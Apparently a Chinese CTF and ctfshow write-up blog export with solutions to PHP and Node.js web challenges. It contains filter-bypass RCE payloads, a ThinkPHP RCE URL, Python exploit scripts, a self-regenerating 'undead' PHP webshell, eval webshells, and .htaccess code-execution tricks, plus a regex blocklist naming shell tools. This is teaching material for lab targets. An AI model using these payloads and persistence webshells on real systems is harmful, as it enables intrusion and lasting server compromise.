<h2 id="2-let-me-rce"><a href="#2-let-me-rce" class="headerlink" title="2_let_me_rce"></a>2_let_me_rce</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pass|exe|file|inc|cat| |\$|\?|\*|more|ca\t|nl|#| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\*|;|\||&amp;|\\\\/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;&quot;</span> . <span class="hljs-variable">$cmd</span> .<span class="hljs-string">&quot;&#x27;;&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>当时一打开就被这过滤吓住了，随便试了下就放弃了，赛后想想应该坚持一下，不要放弃<br>看了wp学到了很多新的知识<br>比如<code>du</code>命令也能列目录，用<code>sed p</code>读文件</p>
<p>赛后复现:<br>没有过滤反引号和单双引号</p>
<p>列目录方法1：<br>先用单引号闭合，然后反引号执行命令，空格用<code>%09</code>绕过</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`l<span class="hljs-string">&quot;&quot;</span>s%<span class="hljs-number">09</span>/`.&#x27;<br></code></pre></td></tr></table></figure>

<p>列目录方法2：<br>使用<code>du -a /</code>命令</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`du%<span class="hljs-number">09</span>-a%<span class="hljs-number">09</span>/`.&#x27;<br></code></pre></td></tr></table></figure>

<p>读文件方法1：<br>原理与列目录方法1一致</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`ta<span class="hljs-string">&quot;&quot;</span>c%<span class="hljs-number">09</span>/cccccreal_flag_here_ccccfffffffllllllllaggggg`.&#x27;<br></code></pre></td></tr></table></figure>

<p>读文件方法2：<br>使用<code>sed p</code>命令</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">?cmd=&#x27;.`sed<span class="hljs-variable">%09p%</span><span class="hljs-number">09</span>/cccccreal_flag_here_ccccfffffffllllllllaggggg%<span class="hljs-number">09</span>`.&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="伊泽瑞尔的php"><a href="#伊泽瑞尔的php" class="headerlink" title="伊泽瑞尔的php"></a>伊泽瑞尔的php</h2><p>赛后复现<br>WHT战队的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">x</span>(<span class="hljs-params">t,k</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x)^<span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> x,y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(t,k*(<span class="hljs-built_in">len</span>(t)/<span class="hljs-built_in">len</span>(k)+<span class="hljs-number">1</span>))])<br><br>session = requests.Session()<br><span class="hljs-comment"># @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));</span><br>cmd = <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span><br>cmd = zlib.compress(cmd)<br>cmd = x(cmd,<span class="hljs-string">&quot;25ed1bcb&quot;</span>)<br>cmd = base64.b64encode(cmd)<br><br>rawBody = <span class="hljs-string">&quot;423b0b7200f4&#123;cmd&#125;85fc5ff71c8e&quot;</span>.<span class="hljs-built_in">format</span>(cmd=cmd)<br><span class="hljs-built_in">print</span>(rawBody)<br>response = session.post(<span class="hljs-string">&quot;http://ctf.zrb.edisec.net:45140/index.php&quot;</span>, data=rawBody)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response body: %s&quot;</span> % response.content)<br>res = re.findall(<span class="hljs-string">r&#x27;niGqOXD4rBhBWZ7t423b0b7200f4(.+)85fc5ff71c8e&#x27;</span>,response.content)[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># $r=@base64_encode(@x(@gzcompress($o),$k));</span><br>res = base64.b64decode(res)<br>res = x(res,<span class="hljs-string">&quot;25ed1bcb&quot;</span>)<br>res = zlib.decompress(res)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure>



<h1 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h1><h2 id="综合渗透-FLAG1"><a href="#综合渗透-FLAG1" class="headerlink" title="综合渗透-FLAG1"></a>综合渗透-FLAG1</h2><p>thinkphp框架<br>简单一扫没有过滤且未修复漏洞<br>用公开的payload打<code>http://82.156.76.152:8077/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>追日杯</tag>
        <tag>安徽</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-权限维持</title>
    <url>/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</url>
    <content><![CDATA[<h1 id="WEB670-WEB676"><a href="#WEB670-WEB676" class="headerlink" title="WEB670-WEB676"></a>WEB670-WEB676</h1><p>这几题做法都一样<br>发现<code>/var/www/html</code>目录可写，既然是权限维持，那么直接传不死马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]) ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;.bk.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>访问一次不死马，会发现目录下生成了<code>.bk.php</code><br>然后check，我推测这个check应该只是删除了当前目录的所有文件，并没有其他操作<br>因为我们的马是不断生成的，所以依旧可以访问<br>这样就拿到了这个靶机的权限和flag</p>
<h1 id="WEB677-WEB678"><a href="#WEB677-WEB678" class="headerlink" title="WEB677-WEB678"></a>WEB677-WEB678</h1><p>发现没有权限写入文件<br>实在没招了，在g4👴那里学了一招</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;while true;do cat /f*;done&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>在一个窗口发送后进程会锁死，另一个窗口check<br>第一个窗口就会不断返回flag</p>
<p>原理大概是因为不杀进程，所以用死循环一直cat flag</p>
<h1 id="WEB679"><a href="#WEB679" class="headerlink" title="WEB679"></a>WEB679</h1><p>在可写的&#x2F;tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);</span><br></code></pre></td></tr></table></figure>
<p>注意特殊字符编码<br>传入后可以在蚁剑看看有没有成功写入php<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%8D%E8%A6%81%E7%A6%BB%E5%BC%80%E6%88%911.png"><br>flag在根目录<br>（出现<code>Notice: Undefined index: a in /tmp/index.php on line 1</code>是正常情况）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%8D%E8%A6%81%E7%A6%BB%E5%BC%80%E6%88%912.png"></p>
]]></content>
      <categories>
        <category>ctfshow-web入门</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
        <tag>web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-大赛原题</title>
    <url>/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98.html</url>
    <content><![CDATA[<p>做一题更新一题吧</p>
<h1 id="WEB692"><a href="#WEB692" class="headerlink" title="WEB692"></a>WEB692</h1><p>绕过addslashes并写入文件配置getshell<br>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>])) <span class="hljs-keyword">die</span>();<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$option=&#x27;<span class="hljs-subst">$str</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure>

<p>首先看一下addslashes() 函数的作用：<br>addslashes() 函数会将预定义的字符前添加反斜杠字符串<br>预定义字符有<code>单引号，双引号，反斜杠，NULL</code>四个<br>效果如图，会添加上<code>\</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/addslashes.png"></p>
<p>所以当我们传入<code>?option=a\&#39;;phpinfo();//</code>时<br>会变为<code>a\\\&#39;;phpinfo();//</code></p>
<p>接着看preg_replace函数<br><code>preg_replace($pattern, $replacement, $string);</code><br>搜索string中匹配pattern的部分，以replacement进行替换。</p>
<p>最终config.php的内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;a\\&#x27;</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//&#x27;;</span><br></code></pre></td></tr></table></figure>
<p>这样就构造了一个phpinfo();<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web692-1.png"></p>
<p>所以直接上传php马<br><code>?option=a\&#39;;eval($_POST[a]);//</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web692-2.png"></p>
<h1 id="WEB701"><a href="#WEB701" class="headerlink" title="WEB701"></a>WEB701</h1><p>出自<code>HarekazeCTF2019-A_Z</code><br>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">let</span> output = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> code = req.<span class="hljs-property">query</span>.<span class="hljs-property">code</span> + <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (code &amp;&amp; code.<span class="hljs-property">length</span> &lt; <span class="hljs-number">200</span> &amp;&amp; !<span class="hljs-regexp">/[^a-z().]/</span>.<span class="hljs-title function_">test</span>(code)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> result = vm.<span class="hljs-title function_">runInNewContext</span>(code, &#123;&#125;, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">500</span> &#125;);<br>      <span class="hljs-keyword">if</span> (result === <span class="hljs-number">1337</span>) &#123;<br>        output = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>      output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;[a-z().]&#x27;</span>, output &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;app.js&#x27;</span>));<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure>
<p>我们只能使用[a-z().]这些字符构造出<code>1337</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (result === <span class="hljs-number">1337</span>) &#123;<br>        output = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>

<p>我们可以用<code>(typeof(this)).constructor()</code>构造出空字符串，而JS中1&#x3D;&#x3D;true，所以<code>(typeof(this)).constructor().length.constructor(true)</code>就会构造出1，或者<code>true.constructor.length</code>。3可以用字符串的big()方法的name.length获得，7可以用<code>true.constructor.name.length</code>得到。最后将所有字符concat在一起即可。</p>
<p>所以最后Payload（不唯一）：<code>eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length))</code></p>
<h1 id="WEB712"><a href="#WEB712" class="headerlink" title="WEB712"></a>WEB712</h1><p>出自<code>XNUCA 2019 EasyPHP</code></p>
<p>题目给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;fl3g.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nJust one chance&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>2-9,25-32行的意思是删除除了文件名是index.php的文件<br>10行包含了fl3g.php文件<br>16-19对content参数，也就是文件内容进行了关键词过滤<br>21-24对filename参数进行了正则过滤，使文件名只允许出现a-z和点</p>
<p>分析完后发现好像对我们写shell没什么影响<br>。。传完后发现不能解析，应该是出题的时候设置了只能解析index.php<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB712.png"></p>
<p>这个时候想到了之前做文件上传时经常用到的<code>.htaccess</code>，直接设置<code>AddType</code>或者<code>SetHandler</code>不就行了吗,但是回过去看那些看似无用的关键词过滤，实际上把这两种情况禁用了</p>
<p>而且内容中还拼接了<code>Just one chance</code>,在<code>.htaccess</code>中会报错，所以要把它注释掉，先利用<code>\</code>拼接上下两行，再用<code>#</code>注释</p>
<p>既然可以用<code>\</code>，那么也就可以绕过过滤了，从而写入被限制的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@autor: Iv4n</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://f47cd164-0248-4cca-993d-8610c32a4aa1.challenge.ctf.show/&#x27;</span><br>r = requests.get(url+<span class="hljs-string">&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&#x27;cat%20../../../fl[a]g\&#x27;);?&gt;\\&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p><code>php_value auto_prepend_file</code>将自身加载到index.php，然后写一句话木马，直接写的话会导致500，所以通过<code>ErrorDocument 404</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/WEB712-2.png"></p>
<h1 id="WEB720"><a href="#WEB720" class="headerlink" title="WEB720"></a>WEB720</h1><p>sha1的强比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>找到两个sha1后相等的值即可</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="hljs-meta">%25PDF-1</span>.<span class="hljs-number">3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%25</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%CF</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20obj</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3C</span>/Width<span class="hljs-meta">%202</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Height<span class="hljs-meta">%203</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Type<span class="hljs-meta">%204</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Subtype<span class="hljs-meta">%205</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Filter<span class="hljs-meta">%206</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/ColorSpace<span class="hljs-meta">%207</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Length<span class="hljs-meta">%208</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/BitsPerComponent<span class="hljs-meta">%208</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0Astream</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%D8</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%00</span><span class="hljs-meta">%24SHA-1</span><span class="hljs-meta">%20is</span><span class="hljs-meta">%20dead</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%85</span>/<span class="hljs-meta">%EC</span><span class="hljs-meta">%09</span><span class="hljs-meta">%239u</span><span class="hljs-meta">%9C9</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%A1</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%3CL</span><span class="hljs-meta">%97</span><span class="hljs-meta">%E1</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%01</span><span class="hljs-meta">%7FF</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%93</span><span class="hljs-meta">%A6</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%7E</span><span class="hljs-meta">%01</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%02</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%AA</span><span class="hljs-meta">%1D</span><span class="hljs-meta">%B2V</span><span class="hljs-meta">%0BE</span><span class="hljs-meta">%CAg</span><span class="hljs-meta">%D6</span><span class="hljs-meta">%88</span><span class="hljs-meta">%C7</span><span class="hljs-meta">%F8K</span><span class="hljs-meta">%8CLy</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%F6</span><span class="hljs-meta">%14</span><span class="hljs-meta">%F8m</span><span class="hljs-meta">%B1i</span><span class="hljs-meta">%09</span><span class="hljs-meta">%01</span><span class="hljs-meta">%C5kE</span><span class="hljs-meta">%C1S</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%DF</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%608</span><span class="hljs-meta">%E9rr</span>/<span class="hljs-meta">%E7</span><span class="hljs-meta">%ADr</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%0EI</span><span class="hljs-meta">%04</span><span class="hljs-meta">%E0F</span><span class="hljs-meta">%C20W</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%E9</span><span class="hljs-meta">%D4</span><span class="hljs-meta">%13</span><span class="hljs-meta">%98</span><span class="hljs-meta">%AB</span><span class="hljs-meta">%E1</span>.<span class="hljs-meta">%F5</span><span class="hljs-meta">%BC</span><span class="hljs-meta">%94</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%E35B</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%80-</span><span class="hljs-meta">%98</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%2A3</span>.<span class="hljs-meta">%C3</span><span class="hljs-meta">%7F</span><span class="hljs-meta">%AC5</span><span class="hljs-meta">%14</span><span class="hljs-meta">%E7M</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%A8t</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%0Cx0Z</span><span class="hljs-meta">%21Vda0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%89</span><span class="hljs-meta">%60k</span><span class="hljs-meta">%D0</span><span 